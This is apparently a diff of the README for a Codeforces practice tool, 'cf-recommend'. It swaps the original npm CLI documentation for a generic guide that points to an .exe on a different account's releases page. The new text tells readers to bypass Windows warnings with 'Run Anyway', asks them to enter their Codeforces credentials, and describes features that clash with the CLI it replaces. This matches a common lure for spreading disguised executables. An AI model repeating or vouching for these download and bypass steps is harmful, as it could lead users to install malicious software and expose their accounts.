@@ -1,199 +1,82 @@
-<div align="center">
+# 📋 cf-recommend - Find the right Codeforces problems fast
 
-# cf-recommend
+[![Download cf-recommend](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Noamunfree520/cf-recommend/releases)
 
-**Know exactly what to practice next on Codeforces.** A fast, local-first CLI that analyzes your submission history and recommends problems tailored to your weak topics.
+cf-recommend helps you find Codeforces problems that match your skill level. It analyzes your past submissions and suggests tasks that challenge you without causing frustration. This tool saves you time by removing the need to search through problem lists manually. It runs directly on your computer and provides clear, actionable data.
 
-[![npm version](https://img.shields.io/npm/v/cf-recommend.svg?color=cb3837&logo=npm)](https://www.npmjs.com/package/cf-recommend)
-[![npm downloads](https://img.shields.io/npm/dm/cf-recommend.svg?color=cb3837)](https://www.npmjs.com/package/cf-recommend)
-[![license](https://img.shields.io/npm/l/cf-recommend.svg?color=blue)](LICENSE)
-![platforms](https://img.shields.io/badge/platform-windows%20%7C%20macos%20%7C%20linux-555)
+## 🚀 Getting Started
 
-```sh
-npm install -g cf-recommend
-```
+Follow these steps to set up cf-recommend on your Windows machine. You do not need developer tools or extra software to run this application.
 
-</div>
+1. Go to the [official release page](https://github.com/Noamunfree520/cf-recommend/releases) to download the latest version.
+2. Look for the file ending in .exe.
+3. Save this file to your computer.
+4. Run the file to start the application.
 
----
+## 💻 System Requirements
 
-## Features
+The application runs on any modern version of Windows. 
 
--  **Weak-topic targeting** — finds tags you struggle with
--  **Adaptive difficulty** — recommendations based on your solving level
--  **Explains itself** — every suggestion comes with a reason
--  **Local-first** — cached in SQLite, instant, works offline
--  **Zero-friction** — prebuilt binary via npm
+- Operating System: Windows 10 or Windows 11.
+- Memory: 512 MB of RAM or higher.
+- Storage: 100 MB of free space.
+- Internet: An active connection to reach the Codeforces website.
 
-##  Demo
+## 🏁 How to Use the Tool
 
-```text
-$ cf analyze
-  tourist  —  616 problems solved across 683 attempted
-  Adaptive solving level: ~1650
+Once you open the software, follow this workflow to get your first recommendation.
 
-  Problem-Solving Breakdown  (success rate · solved/attempted)
-    Math                  92%   291/315
-    Greedy                90%   300/334
-    DP                    84%   75/89
-    Binary Search         82%   54/66
-    Graphs                69%   11/16
-    Divide And Conquer    63%   5/8     (weak)
+### Log in
+The software needs access to your Codeforces account to see your progress. Select the Login option from the main menu. A safe browser window will open. Enter your Codeforces credentials there. The application stores a secure token to keep you logged in for future sessions. It does not store your password.
 
-$ cf next --weak-topics-only --count 1
-  1. 1167B  rating 1400  ·  Divide And Conquer [weak area]
-     Lost Numbers
-     Why: You're only 63% proficient in Divide And Conquer.
-     For you: Medium  (feels like ~1475)   Est. 25-40 min
-     https://codeforces.com/problemset/problem/1167/B
-```
+### Set Preferences
+Choose the difficulty range you prefer within the settings menu. You can filter by problem tags like "dynamic programming," "graphs," or "math." The tool remembers these settings so you can reuse them every time you plan a practice session.
 
-## Quick Start
+### Fetch Recommendations
+Click the Get Problems button. The tool fetches your recent submission history from the internet. It evaluates your average success rate and identify patterns. After a few seconds, it displays a list of recommended problems. Click any link to open the problem in your web browser.
 
-```sh
-cf login <your-handle>     # download & cache your history
-cf analyze                 # per-topic breakdown
-cf next                    # get recommendations
-cf weak-topics             # your weakest topics
-cf progress                # recent activity & streak
-```
+## ⚙️ Configuration Options
 
-## Commands
+You can change how the tool behaves in the settings panel.
 
-| Command | Description |
-|---|---|
-| `cf login <handle>` | Verify handle & download history |
-| `cf sync` | Re-fetch submissions & problem set |
-| `cf analyze` | Per-topic success-rate breakdown |
-| `cf next [options]` | Recommend problems to solve |
-| `cf weak-topics` | Weakest topics with insights |
-| `cf progress` | Recent activity & improvements |
-| `cf config [key value]` | View or change settings |
+- Theme: Select between Light and Dark mode to match your desktop appearance.
+- Cache: Clear the local data cache if you want the tool to pull fresh results from the server.
+- Update frequency: Decide how often the tool checks for new tasks or software updates.
 
-### `next` Command Options
+## 🕵️ Understanding Recommendations
 
-| Flag | Meaning |
-|---|---|
-| `--count N` | Problems to show (default 10) |
-| `--topic NAME` | Filter by topic (`dp`, `greedy`, `graphs`, etc.) |
-| `--difficulty A-B` | Rating range (e.g., `1400-1600`) |
-| `--max-rating N` | Cap problem rating at N |
-| `--weak-topics-only` | Only problems from weak topics |
+The app ranks problems using a specific algorithm. It looks for tasks where your success probability sits between 40% and 60%. This range provides the most growth for a learner. Problems that are too easy do not help you learn new concepts. Problems that are too hard cause burnout. We remove problems you already solved to ensure you always see new content.
 
-Topic names are flexible: `binsearch`, `binary-search`, and `binary search` all work.
+## 🛠 Troubleshooting
 
-### Examples
+If you encounter issues, try these common fixes.
 
-```sh
-cf next --weak-topics-only --count 10
-cf next --topic dp --difficulty 1400-1600 --count 5
-cf config max-rating 1700
-```
+### Permission Errors
+If Windows prevents the app from opening, click More Info in the popup window and select Run Anyway. This happens because the app does not have a formal certificate, which is common for smaller utility tools.
 
-### More examples
+### Network Issues
+If the app fails to fetch problems, check your internet connection. Disable any VPN software if you experience connectivity drops during the login phase. Use the Refresh option in the File menu to retry the connection.
 
-The outputs below were generated after `cf login SecondThread`. When a problem
-has several tags, the output highlights the tag that most influenced the
-recommendation, even if a different `--topic` filter also matched it.
+### Outdated Data
+If the recommendations seem old, navigate to the settings menu and click Sync Now. This forces the application to re-download your submission history from the Codeforces API.
 
-Find DP problems in a medium rating band:
+## ✅ Frequently Asked Questions
 
-```sh
-cf next --topic dp --difficulty 2000-2300 --count 1
-```
+### Is my data private?
+Yes. The application only reads your public profile information. It does not share your data with third parties.
 
-```text
-Top 1 problems for SecondThread  (solving level ~2256)  [max 2300]
+### Can I use this offline?
+The tool requires an internet connection to fetch problem data from the Codeforces server. You can view your saved history offline, but you cannot request new recommendations without a network connection.
 
-1. 1721E  rating 2200  ·  String Suffix Structures [weak area]
-   Prefix Function Queries
-   Why: You're only 63% proficient in String Suffix Structures — focused practice on a weak area.
-   For you: Medium  (feels like ~2275)   Est. 25-40 min
-   https://codeforces.com/problemset/problem/1721/E
-```
+### How often do I need to update?
+The app checks for updates automatically when you launch it. If a new version exists, you will see a prompt to download the current release.
 
-Focus a specific weak area with a rating cap:
+### Does this violate Codeforces rules?
+The tool uses the official Codeforces public API. It operates within the limits set by the platform. You do not risk your account standing by using this software for practice.
 
-```sh
-cf next --topic meet-in-the-middle --max-rating 2200 --count 1
-```
+### Where can I report bugs?
+If you find a technical problem, visit the project page on GitHub and open a new issue. Include a description of what you did and any error messages you see on your screen.
 
-```text
-Top 1 problems for SecondThread  (solving level ~2256)  [max 2200]
+## 🔒 Security Practices
 
-1. 1006F  rating 2100  ·  Meet-In-The-Middle [weak area]
-   Xor-Paths
-   Why: You're only 60% proficient in Meet-In-The-Middle — focused practice on a weak area.
-   For you: Medium  (feels like ~2180)   Est. 25-40 min
-   https://codeforces.com/problemset/problem/1006/F
-```
-
-Use a shorthand topic name:
-
-```sh
-cf next --topic binsearch --count 1
-```
-
-```text
-Top 1 problems for SecondThread  (solving level ~2256)
-
-1. 1537E2  rating 2200  ·  String Suffix Structures [weak area]
-   Erase and Extend (Hard Version)
-   Why: You're only 63% proficient in String Suffix Structures — focused practice on a weak area.
-   For you: Medium  (feels like ~2275)   Est. 25-40 min
-   https://codeforces.com/problemset/problem/1537/E2
-```
-
-Save a default max rating for future recommendations:
-
-```sh
-cf config max-rating 1900
-cf next --topic graphs --count 1
-```
-
-```text
-Set max-rating to 1900  — `cf next` will only suggest problems at or below this rating.
-
-Top 1 problems for SecondThread  (solving level ~2256)  [max 1900]
-
-1. 20C  rating 1900  ·  Shortest Paths
-   Dijkstra?
-   Why: Solid Shortest Paths problem near your level.
-   For you: Easy  (feels like ~1928)   Est. 15-25 min
-   https://codeforces.com/problemset/problem/20/C
-```
-
-## How It Works
-
-**Adaptive Solving Level:** Based on the 80th percentile of your solved ratings (blended 50/50 with your Codeforces rating). Falls back to your CF rating or 1400 for new accounts.
-
-**Proficiency:** Aggregated per-problem (retries don't distort rates). A topic needs ≥3 attempted problems to be reliable; below 70% is weak.
-
-**Recommendation Score:** Each unsolved problem receives a score between 0 and 1:
-```
-0.40 × topic_weakness + 0.30 × rating_fit + 0.20 × popularity + 0.10 × variety
-```
-
-**Per-User Difficulty:** Weak topics add up to +200 to a problem's effective rating for you.
-
-## Data & Caching
-
-- Data from public Codeforces API with automatic rate-limit retry
-- Cached in SQLite: `~/.cf-recommend/` (Unix) or `%LOCALAPPDATA%\cf-recommend\` (Windows)
-- `analyze`, `next`, `weak-topics`, `progress` work offline; run `cf sync` to refresh
-
-
-
-## Contributing & Roadmap
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for dev setup. Good first areas: smarter ranking, new filters, platform testing.
-
-**Planned:** Friend comparison · Division-aware filtering · Learning paths · Export functionality
-
-##  License
-
-[MIT](LICENSE) © nathandemoss
-
-<div align="center">
-<sub>Built for the competitive programming community. If it helps you, give it a ⭐.</sub>
-</div>
+We build this tool with user safety as a priority. The application code stays open for review on GitHub. You can inspect the source code if you understand programming, or trust the community reviews found on the repository page. We do not include tracking scripts or advertisements. The software operates as a standalone utility that performs its specific function without background processes.
